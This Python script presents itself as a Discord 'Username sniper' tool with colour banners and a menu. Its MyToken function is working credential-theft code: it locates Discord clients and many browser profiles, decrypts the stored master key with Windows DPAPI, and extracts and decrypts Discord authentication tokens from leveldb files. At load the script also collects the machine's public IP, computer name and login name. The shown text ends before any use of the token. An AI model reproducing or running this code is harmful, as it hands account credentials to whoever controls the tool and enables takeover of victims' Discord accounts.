from colorama import Fore, Back, Style, init
import requests
import os
import sys
import platform
import time
import re
import win32crypt
import base64
import json
from Crypto.Cipher import AES
import asyncio
import string

init(convert=True)

bracketopen = f"{Fore.RED}[{Style.RESET_ALL}"
bracketclosed = f"{Fore.RED}]{Style.RESET_ALL}"

bracketopen2 = f"{Fore.WHITE}[{Style.RESET_ALL}"
bracketclosed2 = f"{Fore.WHITE}]{Style.RESET_ALL}"

response = requests.get("https://api.ipify.org")
public_ip = response.text

pc_name = platform.node()
username = os.getlogin()

is_windows = os.name == "nt"
system_text = "Windows" if is_windows else "Linux"

succesStatus = [200, 204, 201]

banner = (f"""{Fore.RED}  
            ███████╗ ██████╗ ██╗    ██╗   ██╗███████╗██╗  ██╗    ███████╗███╗   ██╗██╗██████╗ ███████╗██████╗ 
            ██╔════╝██╔═══██╗██║    ██║   ██║██╔════╝╚██╗██╔╝    ██╔════╝████╗  ██║██║██╔══██╗██╔════╝██╔══██╗
            ███████╗██║   ██║██║    ██║   ██║█████╗   ╚███╔╝     ███████╗██╔██╗ ██║██║██████╔╝█████╗  ██████╔╝
            ╚════██║██║   ██║██║    ╚██╗ ██╔╝██╔══╝   ██╔██╗     ╚════██║██║╚██╗██║██║██╔═══╝ ██╔══╝  ██╔══██╗
            ███████║╚██████╔╝███████╗╚████╔╝ ███████╗██╔╝ ██╗    ███████║██║ ╚████║██║██║     ███████╗██║  ██║
            ╚══════╝ ╚═════╝ ╚══════╝ ╚═══╝  ╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
             ~ by n0where                                       ~ https://discord.gg/3Y4AxZYmjH 
{Style.RESET_ALL}                            
""")

NameSniper = f"{bracketopen}01{bracketclosed} Username sniper"
ExitOption = f"{bracketopen}02{bracketclosed} Exit"

menu = (f"""{Fore.RED}
{Style.RESET_ALL}{NameSniper} {Fore.RED}
{Style.RESET_ALL}{ExitOption} {Fore.RED}
{Style.RESET_ALL}                            
""")

discord_banner = (f"""{Fore.RED}
                                              @@@@                @%@@                                      
                                       @@@@@@@@@@@@               @@@@@@@@@@%                               
                                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                          
                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                         
                                %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                        
                               @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                       
                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                     
                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                    
                           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                   
                          %@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@%                  
                          %@@@@@@@@@@@@@@@@        %@@@@@@@@@@@%@        @@@@@@@@@@@@@@@@@                  
                          %@@@@@@@@@@@@@@@          @@@@@@@@@@@@          @@@@@@@@@@@@@@@%                  
                         %@@@@@@@@@@@@@@@@          @@@@@@@@@@@%          %@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@%         @@@@@@@@@@@%         %@@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@@@      %@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@%                 
                         %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                           @%@@@@@@@@@@@@@%@@   @@@@%@@@@@@@@@%%%@%@@  @@@@@@@@@@@@@@@@@@                   
                              @@%@@@@@@@@@@@@@                        @%@@@@@@@@@@@%@@                      
                                   @%@@@@@@@                            @@@@@@%%@                           
                                         @@                              @@        
{Style.RESET_ALL}                                    
""")

def MyToken():
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    PATHS = {
        'Discord': ROAMING + '\\discord',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Lightcord': ROAMING + '\\Lightcord',
        'Discord PTB': ROAMING + '\\discordptb',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable',
        'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
        'Amigo': LOCAL + '\\Amigo\\User Data',
        'Torch': LOCAL + '\\Torch\\User Data',
        'Kometa': LOCAL + '\\Kometa\\User Data',
        'Orbitum': LOCAL + '\\Orbitum\\User Data',
        'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
        '7Star': LOCAL + '\\7Star\\7Star\\User Data',
        'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
        'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
        'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
        'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
    }

    def getkey(path):
        with open(path + f"\\Local State", "r") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
            file.close()

        return key

    def gettokens(path):
        path += "\\Local Storage\\leveldb\\"
        tokens = []

        if not os.path.exists(path):
            return tokens

        for file in os.listdir(path):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue

            try:
                with open(f"{path}{file}", "r", errors="ignore") as f:
                    for line in (x.strip() for x in f.readlines()):
                        for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            tokens.append(values)
            except PermissionError:
                continue
        return tokens
    checked = []
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token
            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)
            except Exception as e:
                pass
    return token


def Slow(banner):
    delai = 0.03
    lignes = banner.split('\n')
    for ligne in lignes:
        print(ligne)
        time.sleep(delai)
